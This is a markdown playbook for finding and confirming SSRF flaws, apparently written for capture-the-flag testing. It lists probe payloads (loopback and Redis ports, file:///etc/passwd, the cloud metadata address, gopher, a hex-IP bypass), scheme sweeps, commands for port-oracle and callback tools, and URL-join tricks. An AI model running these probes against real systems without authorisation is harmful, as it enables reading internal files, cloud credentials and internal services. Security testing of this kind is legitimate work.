# SSRF detection — find the fetch, prove the server dialed

SSRF is not "input reached a URL field" — it is "the SERVER made
the request". Every probe is built around proving who dialled.

---

## 1. Where fetch-points hide — the input inventory

```text
URL-shaped params:     url= uri= link= src= href= target= dest=
                       endpoint= host= domain= site= path= fetch=
                       callback= webhook= redirect= return= next=
                       image= img= avatar= photo= feed= rss=
                       import= export= proxy= load= read= open=
Structured fields:     {"webhook":{"url":...}} {"import":{"source":...}}
                       oembed url, graph nodes, preview cards
File-fields:           an uploaded URL list, a config file with URLs
Header-driven:         X-Forwarded-Host, Referer chains, Host-header
Deferred:              a bot/renderer that visits a stored URL —
                       report-abuse forms, link-checkers, archives
```

Grep source for the fetch calls: `requests.get(` `urllib` `fetch(`
`axios.get` `HttpClient` `curl_exec` `file_get_contents(` `Net::HTTP`
`http.NewRequest` — the input that lands inside one is the point.

## 2. The three-signal confirm — dial, status, timing

```text
1. The reachability pair:
   url=http://127.0.0.1:1/      → connection-refused (fast, err)
   url=http://127.0.0.1:80/     → connect (different err/success)
   → the DIFFERENCE proves the server dialled — your input drove it

2. The timing oracle:
   url=http://10.255.255.1/     → unroutable → hangs → timeout
   url=http://127.0.0.1:1/      → instant refuse
   → elapsed-delta = dial-attempt — no callback needed

3. The callback:
   url=http://YOU.<oob>          → oob_listener records the hit —
                                   method/UA/Referer of the server
   → proves egress + server-side fetch — the cleanest proof
```

Order matters: refused-port first (no egress needed), callback
second (proves egress), port-sweep third (the oracle at scale).

## 3. The read-channel discovery — what comes back

```text
Body echo:    fetched bytes inside the 200 response → full read
Error echo:   fetched bytes inside an ERROR — the red-island case —
              the 401's "message" field carried the file!
Status oracle: only status/length differ → binary read
Timing:       only elapsed differs → slow oracle
OOB only:     nothing back → write-oriented chains (gopher POST,
              redis SET, queue push) — impact without read
```

Read EVERY error body — the fetched content hides in `message`,
`detail`, `body`, `error` fields of non-200s more often than in
200s. A "fetch failed: <content>" pattern is a full read channel.

## 4. The scheme-discovery sweep — what it will fetch

```text
url=http://x/        → baseline
url=file:///etc/passwd → file-scheme? → read primitive
url=gopher://x/      → gopher → raw TCP → internal services
url=dict://x/        → dict → redis-adjacent
url=ftp://x/         → ftp
url=ldap://x/        → ldap
url=sftp://x/ url=tftp://x/ url=imap://x/ url=smtp://x/
url=jar://x/ url=netdoc:///x/  → java-side schemes
url=php://filter/... url=expect://x url=data://x  → php-side
url=http://x:25/     → port-flexibility → cross-protocol spray
```

`curl`-backed fetchers accept gopher/dict/ftp — python-requests
accepts http/https only — the client-lib decides the ceiling.
`ssrf_probe` runs the port-oracle; the scheme-sweep is manual —
fire one probe per scheme, diff which produce non-rejected fetches.

## 5. The backend-technology hints — pick the scheme-set

| Stack hint | Likely fetcher | Schemes to try |
|---|---|---|
| PHP | curl_multi/file_get_contents | http,gopher,dict,ftp,php://,expect://,data:// |
| Python | requests/urllib | http,https only — but urllib file:// on some |
| Java | HttpURLConnection/HttpClient | http,https,jar,netdoc,ftp? — jar/netdoc special |
| Node | axios/got/node-fetch | http,https — but axios+follow-redirects |
| Ruby | Net::HTTP/open-uri | http,https,ftp? — open-uri had file:// issues |
| Go | net/http | http,https — strict |
| curl CLI | libcurl | the whole menagerie — gopher/dict/ldap/imap |

The `User-Agent` on the callback names the client: `libcurl/7.x`,
`python-requests/2.x`, `Java/11`, `axios/1.x`, `Go-http-client`.

## 6. The "is it even SSRF" falsifiers

```text
- the URL field renders but no outbound dial happens → templated
  echo, not fetch — test with refused-port: instant-same-response
  means no dial
- the fetch happens but target is FIXED in source, input is a
  suffix/param → not URL-control → maybe param-injection instead
- YOUR client sees the "fetch" — browser-side load → not server
- the callback arrives from the TARGET's own public IP → could be
  the frontend/proxy not the app — check the UA + the path
- url=http://YOU works but 127.0.0.1 always refused-no-dial →
  egress-allowed but the fetch may go through a proxy — internal
  targets route differently → test a known-internal IP anyway
```

## 7. The first-10 probes

```text
1. url=http://127.0.0.1:1/          — refused — proves dial + err-text
2. url=http://127.0.0.1:<app-port>/ — the app itself — loopback-route!
3. url=http://YOU/                   — callback — egress + UA
4. url=file:///etc/passwd            — file-scheme
5. url=http://169.254.169.254/       — metadata — cloud-shaped?
6. url=http://127.0.0.1:6379/        — redis-port — timing/status
7. url=http://127.0.0.1:11211/       — memcached
8. url=gopher://127.0.0.1:6379/_PING — gopher → redis ping → +PONG?
9. url=http://localhost/             — hostname-form — parser?
10. url=http://0x7f000001/           — hex-ip — parser-bypass probe
```

## 8. `ssrf_probe` — the port oracle in one command

```bash
python3 tools/web/ssrf_probe.py --url 'http://t/fetch' \
    --param url --ports 22,80,443,3306,6379,8000,8080,11211,27017,9200
```
Baseline-refused → sweep → status/length/elapsed deltas → the
open-port inventory. `--url` may embed `{M}` for the slot, or
`--param` names the field; `--body 'url={M}'` for POST.

## 9. The callback tooling — oob_listener

```bash
python3 tools/web/oob_listener.py serve --port 8000 --log hits.jsonl
python3 tools/web/oob_listener.py canary --base http://YOU:8000 --name p1
python3 tools/web/oob_listener.py hits --log hits.jsonl
```
`canary` mints a unique path per payload — hits correlate by token.
A curl smoke-test of the canary proves the listener; silence after
the real payload is a measurement (egress-blocked or no-dial).

## 10. The multi-param surface — urls inside structures

```text
the url-param is often NESTED or a component of a bigger object —
the param-discovery sweep:
  ?u=  ?link=  ?src=  ?target=  ?feed=  ?callback=  ?import=
  ?webhook=  ?redirect=  ?next=  ?return=  ?proxy=  ?image=
  ?host=  ?domain=  ?endpoint=  ?server=  ?api=
  json: {"url":..} {"target":..} {"webhook":..} {"callback":..}
        {"import":{"url":..}} {"config":{"url":..}} {"feed":..}
  array: url[]= / urls[]=
  multipart: the field-name inside the boundary
see json-params.md + request-shapes.md — the discovery sweep is
bounded — each candidate-param to the canary — the ones that fire
are the surface
```

## 11. The sub-request detection — partial-url control

```text
the app fetches url + SOMETHING — you control only part:
  fetch("http://"+host+"/api")    → you control the host-mid —
                                    the host-injection — a host
                                    with a path/? tricks — the
                                    prefix is fixed — "internal#
                                    " — the host-field
  fetch(base+"/"+path)             → the path-suffix — the path-
                                    injection — ../ path-tricks —
                                    the append-point is a path —
                                    traversal to another route —
                                    the "endpoint-join" — a path
                                    that reaches /../internal —
                                    base+path join — the joiner
                                    may not normalize
  fetch("https://"+domain)         → the scheme+host fixed — you
                                    control the domain-mid — the
                                    domain is hostname-position —
                                    a subdomain-of-yours resolves
                                    anywhere — the "x.attacker.com"
                                    is a valid domain-field →
                                    resolves to your-ip → then to
                                    internal via your dns — or
                                    the allowed-domain-suffix
                                    trick
  fetch(template % url)            → the format-insert — the url
                                    is the variable — the whole
                                    url is yours — normal-ssrf
  fetch(urlparse(base).join(url))  → the urljoin — the relative-
                                    url tricks — "//internal" —
                                    the protocol-relative join —
                                    urljoin("http://a/b","//c") =
                                    "http://c/" — the netloc-replace
                                    — a "//internal" url REPLACES
                                    the host — the join is the door
```

## 12. The content-type the fetch returns — the channel-marker

```text
the response's Content-Type tells you the channel-shape:
  text/html       — the page is shown — body-echo
  application/json — the api-response — structured-channel — the
                    fetched-content may be a json-field
  image/*         — the image-channel — the fetched-bytes are
                    treated as image — the content must be image-
                    shaped — polyglot-or-image-validation
  application/pdf — the pdf-channel — pdf_text reads it
  text/plain      — plain-echo
  none/204        — blind — the channel is status-only
```

## 13. The redirect-detection — is the fetched-url a redirect?

```text
the fetcher may FOLLOW redirects — the response shows the FINAL
destination's content — the hop-count isn't visible in the body —
the Location-header is gone — the redirect happened inside —
detect via: your-callback that 302s → the follow reaches your
second-endpoint → the SECOND callback-fires → redirect-follow
confirmed → the redirect-family opens
```

## 14. The "different-host" detection — the app-vhost split

```text
the app may live on multiple vhosts — the internal-app on a
  different vhost — the Host-header decides — your fetch to
  127.0.0.1:80 hits the DEFAULT-vhost — the admin-app may be on
  another name — gopher-for-http with a custom Host-header —
  or the url with the name: http://admin.internal:80/ — the
  internal-vhost by name
```

## 15. The evidence-classes — what each proves

```text
CLASS-EVIDENCE: the server dialled — refused-errors, callbacks,
   the differential — proves "ssrf exists" — not yet the flag
IMPACT-EVIDENCE: internal-content read — /flag contents, the
   metadata, the internal-route's data — the flag-level claim
SURFACE-EVIDENCE: "the param exists", "the form renders" — NOT
   proof — the classifier's hint only — never a confirm
the response the evidence is read from must be bound — http_probe
  holds request+response — the hooks-gate checks the quote is a
  substring of the real bytes — no retyped excerpts
```

## 16. The chained-detection — the second-hop check

```text
fetch-1: url=http://app/proxy?u=<canary> — does the app's OWN
  proxy-fetch fire your canary? — the two-hop — the second-fetch
  may bypass the first-fetch's filter — the chained-reach
fetch-2: url=http://internal/redirect?to=<canary> — the internal
  service's own redirect — the hop-through-internal — the
  redirect-chain through the internal-app
```

## 17. The "same-app" detection — the loopback-self

```text
the app's OWN routes are reachable through the fetch — the
loopback-admin — the route you can't reach directly is one the
server reaches fine — the self-fetch:
  url=http://127.0.0.1:<the-app-port>/<the-admin-route>
  → the loopback-source-ip passes the "internal-only" check —
    the route's auth is the IP-check the fetch satisfies
the /proc/net/tcp read tells you which ports the app listens on —
  then fetch each — the self-map
```
